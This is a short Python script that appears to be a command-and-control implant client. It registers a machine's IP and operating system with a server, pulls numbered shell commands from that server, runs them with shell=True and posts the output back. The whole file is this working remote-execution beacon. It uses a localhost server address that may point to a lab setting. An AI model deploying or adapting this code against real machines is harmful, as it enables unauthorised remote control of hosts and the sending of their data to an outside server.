import requests
import platform
import ast
import subprocess


def initHost(server_ip,ip,os):
    res = requests.post(f'http://{server_ip}:8080/hosts/newHost', json={"IP":f"{ip}","OS":f"{os}"})
    if res.ok:
        print("Host: " + res.text)
        return res.text
    else:
        raise Exception

def getCommands(server_ip,host_id):
    res = requests.get(f'http://{server_ip}:8080/hosts/{host_id}/commands')
    if res.ok:
        print("Received Commands: " + res.text)
        return res.text
    else:
        raise Exception

def postResponse(server_ip,host_id,cmd_id,response):
    """
    Command comes in as 
    1: whoami
    2: pwd

    need to split on the ":", run the command, and return the response with the same #
    """
    res = requests.post(f'http://{server_ip}:8080/hosts/{host_id}/responses', json={"cmd_id":f"{cmd_id}","response":f"{response}"})
    if res.ok:
        print("Posted: " + res.text)
    else:
        raise Exception

def runCommand(server_ip, host_id, command):
    #takes a singular command (1: whoami)
    #split the command
    cmd_id = command.split(":")[0]
    cmd = command.split(":")[1].strip()
    #run the command
    response = subprocess.run(cmd,capture_output=True,shell=True).stdout.decode()
    #return the output with the same ID
    postResponse(server_ip,host_id,cmd_id,response)
    return cmd_id + ": " + response

def main():
    SERVER_IP = "127.0.0.1"
    IP = "10.1.1.100"
    OS = platform.system()
    host_id = initHost(SERVER_IP,IP,OS) #init host 
    commands = getCommands(SERVER_IP,host_id)
    commands = ast.literal_eval(commands) #parse commands into list
    for command in commands:
        print(command)
        runCommand(SERVER_IP,host_id,command)
    pass

if __name__ == "__main__":
    main()
